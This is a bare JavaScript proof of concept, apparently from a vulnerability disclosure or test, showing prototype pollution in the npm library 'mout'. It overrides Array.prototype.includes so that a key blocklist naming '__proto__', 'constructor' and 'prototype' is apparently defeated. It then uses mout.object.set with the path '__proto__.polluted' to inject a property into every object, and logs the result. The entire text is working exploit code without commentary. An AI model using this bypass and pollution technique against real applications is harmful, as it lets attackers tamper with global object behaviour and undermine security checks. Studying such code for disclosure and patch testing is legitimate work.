Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);